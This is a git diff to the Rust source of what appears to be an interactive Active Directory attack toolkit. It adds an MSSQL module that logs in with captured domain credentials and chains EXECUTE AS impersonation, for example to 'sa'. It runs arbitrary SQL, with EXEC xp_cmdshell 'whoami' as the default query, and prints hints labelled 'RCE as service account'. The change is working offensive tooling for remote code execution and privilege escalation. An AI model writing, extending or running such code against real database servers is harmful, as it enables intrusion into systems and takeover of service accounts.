@@ -19,6 +19,7 @@ use crate::attacks::gmsa::{gmsa, GmsaArgs};
 use crate::attacks::golden::{golden, GoldenArgs};
 use crate::attacks::laps::{laps, LapsArgs};
 use crate::attacks::lsa::{lsa, LsaArgs};
+use crate::attacks::mssql::{mssql, MssqlArgs};
 use crate::attacks::ptt::{pth, PthArgs};
 use crate::attacks::rbcd::{rbcd, RbcdArgs};
 use crate::attacks::relay::{relay, RelayArgs, RelayTarget};
@@ -80,6 +81,7 @@ enum Action {
     Badsuccessor,
     Dcshadow,
     Constrained,
+    Mssql,
     ShowRoadmap,
     WipeSession,
     Exit,
@@ -186,6 +188,10 @@ const CATEGORIES: &[(&str, &[(&str, Action)])] = &[
             (
                 "BadSuccessor (2025) — dMSA that succeeds a Domain Admin",
                 Action::Badsuccessor,
+            ),
+            (
+                "MSSQL — xp_cmdshell / EXECUTE AS impersonation",
+                Action::Mssql,
             ),
         ],
     ),
@@ -1081,6 +1087,53 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 account_password,
                 impersonate,
                 target_spn,
+            })
+            .await
+        }
+        Action::Mssql => {
+            let host: String = Input::new()
+                .with_prompt("MSSQL host/IP")
+                .with_initial_text(&s.dc)
+                .interact_text()?;
+            let port: u16 = Input::new()
+                .with_prompt("MSSQL port (SQL Browser resolution not implemented)")
+                .with_initial_text("1433")
+                .interact_text()?;
+            let database: String = Input::new()
+                .with_prompt("Initial database (blank = login default)")
+                .allow_empty(true)
+                .interact_text()?;
+            let execute_as_raw: String = Input::new()
+                .with_prompt("EXECUTE AS chain (comma-separated LOGINs, blank = none). Example: sa")
+                .allow_empty(true)
+                .interact_text()?;
+            eprintln!(
+                "[*] Common one-shots:\n\
+                 [*]   EXEC xp_cmdshell 'whoami'                — RCE as service account\n\
+                 [*]   SELECT SUSER_NAME(), SYSTEM_USER, HOST_NAME()  — identity + host\n\
+                 [*]   SELECT name FROM master..sysdatabases    — list databases"
+            );
+            let query: String = Input::new()
+                .with_prompt("SQL query (single statement)")
+                .with_initial_text("EXEC xp_cmdshell 'whoami'")
+                .interact_text()?;
+            let execute_as: Vec<String> = execute_as_raw
+                .split(',')
+                .map(|t| t.trim().to_string())
+                .filter(|t| !t.is_empty())
+                .collect();
+            mssql(MssqlArgs {
+                auth: crate::shared_args::SmbAuth {
+                    host,
+                    domain: s.netbios(),
+                    user: s.username.clone(),
+                    password: s.password.clone(),
+                },
+                query,
+                port,
+                database: (!database.trim().is_empty()).then(|| database.trim().to_string()),
+                tsv: false,
+                execute_as,
             })
             .await
         }
